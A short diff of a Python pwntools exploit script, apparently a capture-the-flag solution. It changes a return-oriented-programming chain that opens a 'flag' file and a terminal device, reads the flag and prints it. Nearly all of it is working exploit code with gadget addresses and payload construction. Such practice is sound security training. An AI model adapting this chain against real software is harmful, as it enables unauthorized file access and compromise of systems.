@@ -60,10 +60,9 @@ if __name__ == "__main__":
     prdi = 0x0000000000400a73 
     pprsi = 0x0000000000400a71 
     rop = cyclic(0x30 + 8)
-    rop += flat(prdi, filename + 0x10, pprsi, 2, 0, elf.plt['open']) # open("/dev/pts/1", 2) -> 0
+    rop += flat(prdi, filename + 0x20, pprsi, 0, 0, elf.plt['open']) # open("flag", 0) -> 0
     rop += flat(prdi, filename + 0x10, pprsi, 2, 0, elf.plt['open']) # open("/dev/pts/1", 2) -> 1
-    rop += flat(prdi, filename + 0x20, pprsi, 0, 0, elf.plt['open']) # open("flag", 0) -> 2
-    rop += common_gadgets(elf.got['read'], 0x100, filename + 0x50, 2) # read(2, filename + 0x50, 0x100)
+    rop += common_gadgets(elf.got['read'], 0x100, filename + 0x50, 0) # read(0, filename + 0x50, 0x100)
     rop += flat(prdi, filename + 0x50, elf.plt['puts'])
 
     #  DEBUG([0x4008A8, 0x400A6A])
